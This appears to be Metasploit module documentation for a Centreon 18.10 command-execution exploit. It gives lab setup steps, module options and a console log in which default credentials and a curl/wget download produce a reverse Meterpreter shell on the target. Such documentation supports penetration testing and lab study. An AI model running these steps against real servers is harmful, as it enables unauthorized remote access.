## Vulnerable Application

1. [Vendor site](https://download.centreon.com/)
2. [TheCyberGeek's walkthrough](https://thecybergeek.co.uk/cves/2019/09/19/CVEs.html)

### Creating A Testing Environment
Download either the OVA/OVF from https://download.centreon.com/ selecting appliances then version 18.10. 
Import OVF on virtual machine.

## Verification
Do:
1. use exploit/linux/http/centreon_cmd_exec
2. set RHOST target_ip
3. set LHOST your_ip
4. set TARGETURI /centreon
5. set USERNAME login_username
6. set PASSWORD login_password
7. exploit

## Options
Alternative options if needed.<br>
set HTTPDELAY 10<br>
The number of seconds the web server will wait before termination

set METHOD curl/wget<br>
The method used to download shell from target (default is curl)

## Scenario
For testing we use the default web credentials admin:centreon
```
root@TheCyberGeek:~/# msfconsole
msf5 > use exploit/linux/http/centreon_cmd_exec
msf5 exploit(linux/http/centreon_cmd_exec) >  set RHOST 192.168.0.47
msf5 exploit(linux/http/centreon_cmd_exec) >  set LHOST 192.168.0.12
msf5 exploit(linux/http/centreon_cmd_exec) >  set LPORT 4444
msf5 exploit(linux/http/centreon_cmd_exec) >  set TARGETURI /centreon
msf5 exploit(linux/http/centreon_cmd_exec) >  set USERNAME admin
msf5 exploit(linux/http/centreon_cmd_exec) >  set PASSWORD centreon
msf5 exploit(linux/http/centreon_cmd_exec) >  exploit
[ * ] Started reverse TCP handler on 192.168.0.12:4444
[ * ] Successfully got token 7aded091b8d304333bca634dc654fcb4
[ * ] Using URL: http://0.0.0.0:80/jtDFPIxG
[ * ] Local IP: http://192.168.0.12:80/jtDFPIxG
[ * ] Server started.
[ + ] 192.168.0.47:80 - Payload request received: /jtDFPIxG
[ * ] Sending Stage (985320 bytes) to 182.168.0.47
[ * ] Meterpreter session 3 opened (192.168.0.12:4444 -> 192.168.0.47:57338) at 2020-01-16 13:30:23 +0100
[ + ] timeout
[ * ] Server stopped. 
meterpreter > getuid
uid=48(apache) gid=48(apache) groups=48(apache),993(centreon-engine),994(centreon-broker),998(centreon),999(nagios)
```

